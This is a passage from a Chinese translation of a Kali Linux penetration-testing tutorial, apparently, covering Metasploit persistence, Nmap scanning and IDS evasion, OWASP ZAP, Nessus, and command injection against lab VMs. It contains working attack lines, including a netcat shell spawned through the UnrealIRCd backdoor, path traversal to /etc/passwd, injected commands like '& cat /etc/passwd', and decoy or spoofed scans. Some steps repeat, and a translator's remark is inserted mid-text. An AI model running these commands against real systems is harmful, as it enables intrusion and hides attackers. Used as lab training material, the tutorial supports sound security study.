  \ `?>`。我们必须手动修复这些标签才能使其正常工作。\n\n2. 在文本编辑器中打开 shellcode 文件并如下所示修改标签：\n\n![](img/image00679.jpeg)\n\
  \n3. 现在，将恶意的 PHP 文件复制到我们的易漏洞网站（我们将在 Web 渗透章节中详细介绍这一点）。\n\n4. 启动 handler 服务：\n\n\
  ![](img/image00680.jpeg)\n\n5. 浏览到易漏洞网站，并在 Kali 的浏览器中执行 PHP 命令：\n\n![](img/image00681.jpeg)\n\
  \n6. 我们我们得到了一个 shell：\n\n![](img/image00682.jpeg)\n\n## 其他选项\n\n这里是一些关于持久化（Persistence）的额外选项：\n\
  \n**Meterpreter Service** - Metasploit 服务或 `Metsvc` 是 Windows 上常用的后门选项。但由于某些原因，在写作时它似乎在\
  \ Kali 2 中无法针对 Windows 7 主机。它可能仍然对 Windows XP 有效。\n\n![](img/image00683.jpeg)\n\n\
  **VNCInject** - 虽然不是真正的持久化选项，但通过 VNC 控制远程 Windows 主机总是很有趣的。但由于某些原因，在写作时 VNC 负载和注入模块似乎无法在\
  \ Windows 7 上工作。\n\n![](img/image00684.jpeg)\n\n**创建你自己的** - 不要忘记你始终可以使用 `msfvenom`\
  \ 创建自己的 shell 文件，并将其设置为在 Windows 上自动加载。我将此留作为一个挑战性练习，供读者如果愿意的话尝试。作为一个提示，我们在在本节稍早时候已经做过这一点了。\n\
  \n## 未来\n\n另一个仍在开发中的兴奋功能是新的“Transport（传输）”Metasploit 功能。虽然在技术上不是为了持久化，但“transports”是\
  \ Metasploit 的一项新功能，为连接添加了韧性。Transports 允许你设置多个不同类型的负载。一旦设置好，你就可以在命令之间进行切换。此外，如果到某个负载的连接失败，它会自动滚动到下一个负载，以确保连接不间断。\n\
  \n基本上，你使用 `add` 关将负载设置为传输，然后根据需要添加额外的负载。你可以使用 `transport next` 和 `transport prev`\
  \ 命令在各个传输之间移动。Transports 是从活动的 meterpreter 会话添加的。\n\n可用的负载有：\n\n- `bind_tcp`\n-\
  \ `reverse_tcp`\n- `reverse_http`\n- `reverse_https`\n\n![](img/image00685.jpeg)\n\
  \n请关注此功能，当它完成后应该将非常有用。更多信息请查看 Transport Control Wiki 地址：\n\n[`github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control`](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control)\n\
  \n### 结论\n\n在本节中，我们涵盖了使用 Kali 2 中的工具创建持久化后门的多种方法。正如前面提到的，很多时候你只是想添加一个用户或服务，这有些微不足道。但如果你需要创建一个后门，Kali\
  \ 提供了多种选项来创建你恰切需要的。\n\n## 资源\n\n- 定计划持久化 - [`www.pentestgeek.com/penetration-testing/scheduled-tasks-with-s4u-and-on-demand-persistence/`](https://www.pentestgeek.com/penetration-testing/scheduled-tasks-with-s4u-and-on-demand-persistence/)\n\
  \n### 扫描\n\n## 第 14 章\n\n## Nmap\n\n在我之前的书中，我们简要地查看了如何使用 `nmap` 扫描系统的开放端口并进行软件版本识别。Nmap\
  \ 是一个不可或缺的工具，你不仅可以用它扫描端口和系统版本信息，还可以检测漏洞。因此，在本节中我想更深入地查看 Nmap 及其可用功能。\n\n对于本教程，我们将使用\
  \ Metasploitable VM。\n\n### 基础扫描\n\n让我们来看一些基础扫描。你可以使用 `-v` 和 `-vv` 选项来增加 `nmap`\
  \ 的详细程度。\n\n### 扫描特定端口\n\nNmap 还允许你对特定端口或协议进行精细扫描。\n\n- 端口扫描 (`-p`）：`nmap [Target\
  \ IP] -p 21`\n- 多个端口：`nmap [Target IP] -p 21,25,80`\n- 扫描常用 TCP 端口：`nmap [IP Address]\
  \ --top-ports <number>`\n- 扫描 UDP 端口 (`-sU`）：`nmap -sU [Target IP] -p 53`\n\n\n\n\
  \n仔细观察检测到的服务及其软件版本。正如我在第一本书中演示的那样，扫描端口并找出正在运行哪些服务以及这些服务的版本是什么，是利用系统的关键。在最简单的层，找到服务的软件版本并搜索漏洞。你可以使用\
  \ `Metasploit` 处理 `Metasploitable` 虚拟机中的许多漏洞，但你也可以使用 `Nmap` 脚本来发现、有时利用这些漏洞。\n\n\
  #### 使用脚本配合 Nmap\n\n有许多脚本可以配合 `nmap` 使用，将其从一个扫描器转变为复杂的测试工具和攻击平台。在 nmap 页面上提供了脚本列表：[`nmap.org/nsedoc/index.html`](https://nmap.org/nsedoc/index.html)\n\
  \n让我们详细查看其中几个脚本。要查看你安装了哪些脚本，请检查 `/usr/share/nmap/scripts` 目录。需要注意的是，如果脚本不起作用，目标可能并不受漏洞，或者你可能没有安装单个脚本网页上列出的所有必要文件。\n\
  \n##### FTP 暴力破解攻击\n\n首先是 FTP 暴力破解脚本：\n\n```\nnmap --script ftp-brute -p 21 192.168.1.68\n\
  ```\n\n为了看到它的运行，在它运行时，打开 `Wireshark` 并捕获 `eth0` 上的流量。你应该看到类似的内容：\n\n![](img/image00696.jpeg)\n\
  \n但 `nmap` 到底在做什么？让我们来发现。选择从你的 `Kali` 系统发送到 `Mutillidae` 虚拟机的一个 TCP 数据包。右键点击它并点击“跟踪\
  \ TCP 流”。你应该看到类似的内容：\n\n```\n220 (vsFTPd 2.3.4)\nUSER webadmin\nPASS matthew\n[34\
  \ bytes missing in capture file]530 Login incorrect.\n```\n\n`Nmap` 正在通过循环用户名和密码列表尝试登录\
  \ FTP 服务器！短段时间后，你应该看到这个：\n\n![](img/image00697.jpeg)\n\n`Nmap` 能够使用“user”的用户名和密码登录。为了验证这一点，打开终端并输入\
  \ `telnet -l user 192.168.1.68`。`-l` 选项提供用户名，因此系统将只需提示输入密码。输入“user”你即可登录：\n\n![](img/image00698.jpeg)\n\
  \n##### 扫描被利用的服务\n\n当网络被攻破时，黑客会尝试为自己创建一个后门。在极少数情况下，合法软件中实际上发现了后门。使用 `Nmap` 我们可以使用\
  \ `irc-unrealircd-backdoor` 扫描器来扫描此类实例。`Metasploitable` 正在端口 `6667` 上使用 `Unreal\
  \ IRC` 服务，我想它是否可能存在漏洞？\n\n继续运行：\n\n```\nnmap -p 6667 --script=irc-unrealircd-backdoor\
  \ 192.168.1.68\n```\n\n`Nmap` 将运行几秒钟，然后显示：\n\n```\n6667/tcp open      IRC      \
  \       Unreal ircd\n|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd.\
  \ See http://seclists.org/fulldisclosure/2010/Jun/277\n```\n\n看起来 `Metasploitable`\
  \ 中安装的 `Unreal IRC` 存在漏洞，我知道这很意外！让我们使用 `Netcat` 和 `Nmap` 来利用它。根据 `nmap` 命令信息页，我们可以使用\
  \ `--script-args=irc-unrealircd-backdoor.command=` 切换向该脚本发送命令。通过此命令，我们可以告诉机器上的木马以监听器模式启动\
  \ `Netcat`：\n\n```\nnmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc\
  \ -l -p 4444 -e /bin/sh' 192.168.1.68\n```\n\n运行时运行时你会得到一些错误，但只需忽略它们即可。此命令触发了秘密后门，告诉系统启动\
  \ `Netcat` 并在端口 `4444` 上监听我们的连接尝试。因此，我们需要做的只是启动 `Netcat` 并指向该端口：\n\n```\nnetcat\
  \ 192.168.1.68 4444\n```\n\n我们将获得一个远程 shell。没有提示符，直接输入命令即可：\n\n![](img/image00699.jpeg)\n\
  \n接下来我们将查看如何扫描并利用“Heartbleed”漏洞。\n\n#### OpenSSL-Heartbleed - 扫描与利用\n\n去年 `OpenSSL-Heartbleed`\
  \ 漏洞引起了相当动动。令人难以信的是，一年后，仍有大量面向公众的服务器从未被完全修复：[`www.venafi.com/blog/post/still-bleeding-one-year-laterheartbleed-2015-research/`](https://www.venafi.com/blog/post/still-bleeding-one-year-laterheartbleed-2015-research/)\n\
  \n让我们看看如何使用 `nmap` 扫描漏洞系统并使用 `Metasploit` 利用它。对于一个漏洞服务器，我使用了一个过时的 `Wordpress` 虚拟机。\n\
  \n\n\n\n在我们结束本节之前，让我们快速查看一下 Nmap 的 IDS 规避和高级扫描选项。`Nmap` 扫描可以进行修改以尝试绕过入侵检测系统（IDS）或掩盖攻击者。我们将使用\
  \ `Wireshark` 分析其中一些选项以查看差异。\n\n对于这些每项，只需启动 `Wireshark`（输入“Wireshark”，选择接口 `Eth0`\
  \ 并点击“Start Scan”），并在您运行单个 `Nmap` 命令时让它持续运行，然后比较不同扫描之间的结果。\n\n### 基准 - 常规扫描\n\n\
  命令：`nmap 192.168.1.68`\n\n![](img/image00709.jpeg)\n\n如你所见，结果非常有条理性。扫描生成了大量的顺序往返流量。这在\
  \ IDS 和其他网络监控系统中非常显眼。同时注意，流量直接流于我们的 Kali 和目标系统之间。任何人都能快速看到扫描源自何处。\n\n### 分片扫描\n\n\
  命令：`nmap -f 192.168.1.68`\n\n![](img/image00710.jpeg)\n\n通过分片扫描，`nmap` 发送多个分片包以尝试绕过\
  \ IDS 检测。分片被重组，然后目标系统做出响应。注意扫描仍然具有某种顺序性，且扫描源非常明显。\n\n### 诱骗扫描\n\n命令：`nmap 192.168.1.68\
  \ -D 192.168.1.20,10.0.0.34,192.168.1.168,10.0.0.29`\n\n![](img/image00711.jpeg)\n\
  \n诱骗扫描开始变得有趣起来。这种扫描允许你输入一组虚造的 IP 地址作为攻击地址。如你在上面的 `Wireshark` 输出所示，看起来有 5 个不同的源正在扫描目标系统，而不是只有一个。根据\
  \ `Nmap`，某些常用的端口扫描器一次只会跟踪并显示 6 个扫描器，因此如果你使用更多诱饵，你的真实 IP 可能甚至不会出现！\n\n### 伪装扫描\n\n\
  命令：`nmap 192.168.1.68 -S 192.168.1.168 -e eth0`\n\n![](img/image00712.jpeg)\n\n\
  伪装扫描很有意思。你在伪装扫描地址的同时扫描目标，使其看起来像是别人在进行攻击。你可能无法获得可用的响应（或根本没有响应），但如果有人试图让看起来是另一家公司甚至国家在扫描他们，这可能会很有用——有人能做到“溯源”吗？\n\
  \n![](img/image00713.jpeg)。\n\n### 结论\n\n在本章中，我们学习了如何使用 `nmap` 执行基础系统扫描。我们还学习了如何使用\
  \ `nmap` 脚本大幅扩展 `nmap` 的功能。我们没有涵盖 `nmap` 的所有特性，例如 ARP 扫描、Ping 扫描、圣诞树扫描或时序攻击，也没有查看每一个脚本。但这些信息可以在帮助文件和在线手册中找到。提供的帮助信息非常直观，我建议你花些时间玩玩它们，这样你就能变得非常熟悉\
  \ `nmap` 的功能。\n\n如果你想学习更多关于使用像 `nmap` 等工具扫描网络的知识，我强烈推荐 Justin Hutchens 编写的《Kali\
  \ Linux Network Scanning Cookbook》一书。这绝对是我过的关于扫描的最棒、最详尽的书之一。\n\n# 第 15 章\n\n## OWASP\
  \ ZAP\n\nOWASP Zed Attack Proxy (ZAP) 或 `ZaProxy` 是一种 Web 扫描和测试工具，可供安全专业人员和开发者使用。你可以使用\
  \ `ZAP` 做很多事情；我们将仅涵盖安全测试中一些常用功能。你可以从 Web Application Proxy 菜单或从命令行提示 `zaproxy` 启动\
  \ `OWASP ZAP`。\n\n![](img/image00714.jpeg)\n\n当你启动程序时，系统会询问你是否想要“持久 ZAP 会话”。这将存储活动会话，以便你以后回来。现在，只需选择“no,\
  \ I do not want to persist this session at this moment in time”并点击“start”：\n\n![](img/image00715.jpeg)\n\
  \n然后会出现主界面。如你所见，屏幕分为三个不同的部分——左上角的 Sites 窗口，右上角的快速启动/请求/响应窗口，以及底部的消息框。\n\n### 快速扫描与攻击\n\
  \n要快速进入状态，只需在“URL to attack”输入框中输入目标地址（Metasploitable 2 系统）并点击“Attack”按钮。\n\n![](img/image00716.jpeg)\n\
  \n这将对整个目标网站进行爬虫遍历并扫描漏洞。扫描进度和发现的页面将在底部窗口显示。完成后，按“Alerts”查看网站的任何安全问题：\n\n![](img/image00717.jpeg)\n\
  \n如你所见，`ZAP` 发现了网站的多个问题。每个文件夹包含不同类型的安全问题。现在，让我们只检查第一个告警，“Path Traversal”（路径遍历）文件夹。继续点击展开它，然后点击第一个告警：\n\
  \n![](img/image00718.jpeg)\n\n在右侧，你将看到可能存在问题的页面以及风险级别：\n\n![](img/image00719.jpeg)\n\
  \nOWASP ZAP 还解释了该错误：\n\n“路径遍历攻击技术允许攻击者访问可能位于 Web 根目录之外的文件、目录和命令。任何暴露基于 HTTP 接口的设备都可能受到路径遍历的威胁。大多数网站限制对文件系统特定部分的访问，该部分通常被称为“web\
  \ 文档根目录”或“CGI 根目录”。这些目录包含旨在供用户访问的文件。为了访问文件系统任何位置的文件或执行命令，路径遍历攻击将利用特殊字符序列的能力。最基本的路径遍历攻击使用\
  \ `../` 特殊字符序列来更改 URL 中的资源位置。虽然大多数流行的 Web 服务器会阻止这种技术逃离 Web 文档根目录，但 `../` 序列的替代编码可能有助于绕过安全过滤器。这些方法变体包括有效无效的\
  \ Unicode 编码（`..%u2216` 或 `..%c0%af`）、基于 Windows 的服务器上的反斜字符（`..\\`）、URL 编码字符（`%2e%2e%2f`）以及反斜字符的双\
  \ URL 编码（`..%255c`。”\n\n基本上这意味着可以通过特殊序列查看 Web 服务器上的文件或文件夹。OWASP ZAP 为我们提供了输入的精确命令：\n\
  \n`http://192.168.1.68/mutillidae/?page=%2Fetc%2Fpasswd`\n\n上面的命令将列出 Metasploitable\
  \ 服务器上的网页。如果在 Kali 系统的 浏览器中输入此 URL，它将访问 Metasploitable 服务器并调取特定的网页，`?page=` 部分后面是要显示的网页。\n\
  \n告警请求的页面是 `%2Fetc%2Fpasswd`。现在这看起来没什么，但如果你熟悉 Linux（以及编码），命令就变成了 `/etc/passwd`，这是服务器密码文件的位置！\n\
  \n在 Kali Web 浏览器中输入此网页地址将返回：\n\n![](img/image00720.jpeg)\n\n你看到一个看起来正常的网页，但如果你查看中间窗口，就会看到这些信息：\n\
  \n\n\n```\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh\
  \ bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync\
  \ games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh\
  \ mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\
  \ proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh\
  \ list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh\
  \ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh\
  \ libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false\
  \ syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false\
  \ sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\
  \ bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false\
  \ ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\
  \ mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false\
  \ distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash\
  \ service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false\
  \ proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false\
  \ snmp:x:115:65534::/var/lib/snmp:/bin/false\n```\n\nLinux 密码文件的内容——显然这不是你希望显示在网页上的内容。对于\
  \ OWASP-ZAP 发现的每一个警告，它还会包含一个保护你的系统免受所发现漏洞的解决方案。如下所示：\n\n![](img/image00721.jpeg)\n\
  \n### 中间人（MitM）攻击\n\n现在我们已经看到了快速扫描功能，让我们来看看如何使用中间人（MitM）代理功能来获得更好的结果。首先创建一个“新会话”（New\
  \ Session）。\n\n- 点击“文件”（File）然后点击“新会话”（New Session）\n\n这将从数据库中移除收集的数据并为我们提供一个全新的开始。或者直接关闭\
  \ ZAP 并重启。\n\n1. 现在，打开 Iceweasel\n2. 在屏幕最右侧点击“打开菜单”（Open Menu）按钮（三条横线）\n3. 打开“首选项”（Preferences），“高级”（Advanced），“网络”（Network），然后点击“设置”（Settings）：\n\
  \n![](img/image00722.jpeg)\n\n4. 点击“手动代理”（Manual Proxy），将代理设置为“localhost”，端口设置为“8080”，点击“确定”（OK）：\n\
  \n![](img/image00723.jpeg)\n\n现在中间人代理已设置好，访问 Mutillidae 菜单（Metasploitable IP 地址/mutillidae），并打开几个页面，以便中间人拦截代理可以仔细查看它们。在您打开的每一个页面中，按照要求输入内容，例如：\n\
  \n5. 点击“OWASP Top 10”（Owasp Top 10）\n6. 从“A1 注入”（A1 Injection）菜单中选择“命令注入”（Command\
  \ injection）和“DNS 查找”（DNS lookup）。\n7. 查找一个 DNS 名称。如果你需要，可以使用本地机器：\n\n![](img/image00724.jpeg)\n\
  \n8. 现在中间人代理已设置好，访问 Mutillidae 菜单（Metasploitable IP 地址/mutillidae），并打开几个页面，以便中间人拦截代理可以仔细查看它们。在您打开的每一个页面中，按照要求输入内容，例如：\n\
  \n5. 点击“OWASP Top 10”\n6. 从“A1 注入”菜单中选择“命令注入”和“DNS 查找”。\n7. 查找一个 DNS 名称。如果你需要，可以使用本地机器：\n\
  \n![](img/image00724.jpeg)\n\n*(注：原文后续存在大量重复段落，译文已按要求去除了重复输出)*\n\n\n\n\n- [SQL 注入预防备查表](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)\n\
  \n# 第 16 章\n\n## 商业 Web 应用程序扫描器\n\n市场上有很多商业 Web 应用扫描器。有些提供免费的家庭用户版本，许多提供限时免费试用。虽然我只会演示如何安装和运行其中一个\
  \ `Nessus`，但它们的安装和使用方法大体相似，尽管功能上有所不同，某些可以通过额外的插件进行修改。如果你在为公司选择一个，我能提供的建议是研究你的需求并与可用工具进行比较。获取试用版本并尝试一下看看它是否满足你的需求。可以在\
  \ OWASP 网站上找到商业扫描工具列表：\n\n[`www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools`](https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools)\n\
  \n在书的后后部分，我们将查看 Kali 自带的多个工具，这些工具要么完全开源/免费，要么拥有你可以升级的商业版本。\n\n### Nessus\n\n`Nessus`\
  \ 不包含在 Kali 中，它是一个需要购买的授权程序。但你可以从 Nessus 网站获取试用版进行尝试。要获取 `Nessus Professional` 的试用版，请访问\
  \ ([`www.tenable.com/evaluate`](http://www.tenable.com/evaluate)) 并请求评估密钥。然后从下载页面下载适用于\
  \ Kali Linux 的 `Nessus Pro` 并安装它：\n\n![](img/image00738.jpeg)\n\n启动 `Nessus` 进程：\n\
  \n- 输入 `/etc/init.d/nessusd start`\n- 然后访问 `https://kali:8834/`\n\n这将启动注册过程：\n\n\
  ![](img/image00739.jpeg)\n\n在配置向导期间，你将：\n\n- 创建一个 `Nessus` 程序管理员账户\n- 输入产品注册码（或评估代码）\n\
  \n完成后，`Nessus` 会下载更新和最新的插件。这可能需要一些时间。完成后，直接登录。\n\n### 基础扫描\n\n让我们执行一次基础扫描：\n\n-\
  \ 点击“New Scan”（新建扫描）\n- 然后点击“Basic Network Scan”（基础网络扫描）\n\n这将打开基础网络扫描表单。\n\n通常会在每个标签页中填写信息以执行专业扫描，但为了快速测试，只需进入“General\
  \ Tab”（常规标签页），为扫描输入名称（我只是用了‘test’），并将 Mutillidae 的 IP 地址作为目标地址（Target Address）：\n\
  \n![](img/image00740.jpeg)\n\n然后点击“Save”（保存），`Nessus` 将扫描目标网站。你可以点击正在进行的扫描以显示状态页面：\n\
  \n![](img/image00741.jpeg)\n\n点击“Vulnerabilities”（漏洞）标签页查看发现的问题：\n\n![](img/image00742.jpeg)\n\
  \n如上面的图片所示，`Nessus` 发现了 113 个漏洞。注意其中几个是后门或“远程获取 shell”——这些是你是你绝不希望在自己的网络中发现的！点击单个项目将显示该问题的深度解释以及解决方法。\n\
  \n让我们快速查看关键漏洞（Critical vulnerability）“Rogue Shell Backdoor Detection”（恶意 Shell 后门检测）：\n\
  \n![](img/image00743.jpeg)\n\n根据此消息，在 Metasploitable 系统的端口 `1524` 上运行着名为 `wild_shell`\
  \ 的恶意后门。我们如何检查这是否属？使用 `Netcat`！\n\n`Netcat` 是一个像瑞士军刀一样完美的工具，在许多不同的方面都有用。只需打开终端，运行\
  \ `Netcat` 并如下所示添加目标 IP 和端口：\n\n![](img/image00744.jpeg)\n\n如你所见，我们利用 `Nessus` 扫描返回的信息，通过简单运行\
  \ `Netcat` 就能证明该问题的存在。\n\n在我继续之前，最后一个要查看的信息标签页是“Remediation”（修复）。此部分提供了纠正漏洞的额外建议：\n\
  \n![](img/image00745.jpeg)\n\n## Web 应用程序测试\n\n基础扫描揭示了影响我们目标的基础服务器问题。让我们再次扫描 Mutillidae，这次我们将寻找\
  \ Web 应用漏洞。我们还将更改一些额外选项以获得更深扫描。\n\n- 创建新扫描\n- 点击“Web Application Tests”（Web 应用程序测试）\n\
  - 在 General 标签页下 - 输入测试名称（Test2）和目标 IP 地址\n- 在 Assessment 下 - 将 Scan Type 设置为“Scan\
  \ for all web vulnerabilities (complex)”（扫描所有 Web 漏洞（复杂））：\n\n![](img/image00746.jpeg)\n\
  \n这种深度复杂的扫描将遍历整个 Mutillidae 系统寻找问题。\n\n- 最后点击“Save”开始扫描。\n\n![](img/image00747.jpeg)\n\
  \n你可以通过包含网站凭和登录请求脚本在 `Nessus` 中执行更高级的扫描。这有助于发现 SQL 注入和脚本问题。我们不会涵盖这一点，稍后将使用 Burp\
  \ Suite 查看其他测试 SQL 注入漏洞的方法。\n\n### 结论\n\n正如我们通过 `Nessus`所示，商业扫描解决方案可以在 Kali Linux\
  \ 上非常容易地安装和使用。再次，我强烈建议你研究公司的需求并进行独立研究，以找到最符合你需求的解决方案。\n\n# WebApp 渗透测试\n\n## 第 17\
  \ 章\n\n## 命令注入\n\nOWASP Top 10 项目是 Web 应用程序面临的最主要威胁汇编。根据他们的网站，它是“十大最关键的 Web 应用程序安全风险列表”。Mutillidae\
  \ 包含了这些漏洞并允许你练习利用它们，从而在安全测试和安全编码实践方面积累经验。\n\n在本章中，我们将学习命令注入漏洞，并查看我们如何欺骗允许输入的网页在实际\
  \ Web 服务器上运行系统命令。在有漏洞的网站上进行命令注入允许我们在合法输入末尾附加系统命令。在本章中，我们将分别从 Windows 7 和 Metasploitable\
  \ 虚拟机使用 Mutillidae，这样我们就可以分别在 Windows 和 Linux 环境下看到该漏洞。我们将使用 Mutillidae 的 DNS 查找页面练习学习命令注入。\n\
  \n- 启动你的 Windows 7 和 Metasploitable 虚拟机\n- 在 Kali 中打开 Iceweasel\n- 访问 Windows 7\
  \  Mutillidae：\n\n![](img/image00748.jpeg)\n\n从 Mutillidae 主菜单中，选择菜单选项 OWASP 2013\
  \ > A1-Injection (Other) > Command Injection > DNS Lookup，我们将看到查找页面：\n\n在正常情况下，你输入网站名称或\
  \ IP 地址，它会执行 DNS 查找并返回请求的信息。所以，如果我们输入“Google.com”并点击“Lookup”，我们会看到：\n\n非权威回答（Non-authoritative\
  \ answer）：\n\nName: google.com\nAddress: 74.125.226.7\nName: google.com\nAddress:\
  \ 74.125.226.1\nName: google.com\nAddress: 74.125.226.0\nName: google.com\nAddress:\
  \ 74.125.226.3\nName: google.com\nAddress: 74.125.226.2\n\n易受命令注入的网站意味着 Web 应用在编写时没有过滤或验证我们的输入，允许我们附加并运行系统命令。这通常通过使用\
  \ `&`、`&&` 或 `|` 符号附加命令，并使用 `;` 分隔多个命令来实现。让我们针对自己的路由器地址尝试，看看能否使用 `dir` 命令获取 Web\
  \ 服务器的目录。我将仅使用单个 `&` 作为分隔符。如果你的目标是 Linux 服务器，只需用 `ls` 代替 `dir`。\n\n我的路由器地址是 `192.168.1.1`。如果我对该\
  \ IP 进行 DNS 记录查找，我看到返回了一个简单的记录：\n\n![](img/image00750.jpeg)\n\n![](img/image00751.jpeg)\n\
  \n现在让我们添加一个系统命令，看看是否能欺骗 Web 服务器给出任何信息：\n\n- 输入 `192.168.1.1 & dir`\n\n![](img/image00752.jpeg)\n\
  \n如预期，它立即返回了我的路由器的 DNS 信息。但它还返回了服务器上 Mutillidae 的目录列表：\n\n![](img/image00753.jpeg)\n\
  \n\n\n\n现在我们实际上知道这个 Web 应用程序存在命令注入漏洞，而且我们也知道服务器当前的工作目录。我们基本上可以运行任何我们想要的命令。这在网站的\
  \ Windows 版本和 Linux 版本中都是如此。\n\n例如，在我们的 Metasploitable Mutillidae 虚拟机上，我们可以通过 `192.168.1.1\
  \ & cat /etc/passwd` 来获取用户列表：\n\n![](img/image00754.jpeg)\n\n这会忠实地从系统 passwd 文件中转储用户列表：\n\
  \n![](img/image00755.jpeg)\n\n在 Linux 系统上，我们可以使用 `;` 将命令组合，而在 Windows 目标上则使用额外的\
  \ `&`。例如，在 Windows 7 Mutillidae 上，如果我们要想 `cd` 到根目录并执行 `dir` 命令：\n\n 输入回车，`192.168.1.1\
  \ & cd \\ & dir`\n\n![](img/image00756.jpeg)\n\n这正确地切换到了根目录并执行了目录列表：\n\n```\nVolume\
  \ in drive C has no label.\nVolume Serial Number is CC53-BFFC\nDirectory of C:\\\
